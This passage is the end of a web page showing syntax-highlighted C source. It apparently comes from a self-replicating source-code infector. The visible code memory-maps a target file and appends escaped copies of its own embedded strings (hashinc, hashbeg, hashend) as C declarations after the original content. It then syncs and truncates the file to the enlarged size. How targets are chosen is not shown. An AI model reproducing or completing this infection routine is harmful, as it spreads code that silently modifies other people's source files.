                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%c"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashinc</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0"> 
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\";\n\tchar hashbeg[] =\""</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">21</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc4">100</span><span class="sc10">*</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashbeg</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashbeg</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">hashbeg</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\n"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\t'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\t"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\\\"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\"'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\\""</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%c"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashbeg</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0"> 
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\";\n\tchar hashend[] =\""</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">21</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc4">100</span><span class="sc10">*</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashend</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashend</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
                        </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">hashend</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\n"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\t'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\t"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\\\"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc7">'\"'</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\\""</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">default</span><span class="sc10">:</span><span class="sc0">
                                </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%c"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashend</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0"> 
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">));</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\";\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bhole</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc11">ehole</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">hashend</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">+</span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hashend</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ehole</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">msync</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">page</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MS_SYNC</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">page</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">ftruncate</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">+</span><span class="sc11">ihole</span><span class="sc10">+</span><span class="sc11">thole</span><span class="sc10">+</span><span class="sc11">bhole</span><span class="sc10">+</span><span class="sc11">ehole</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
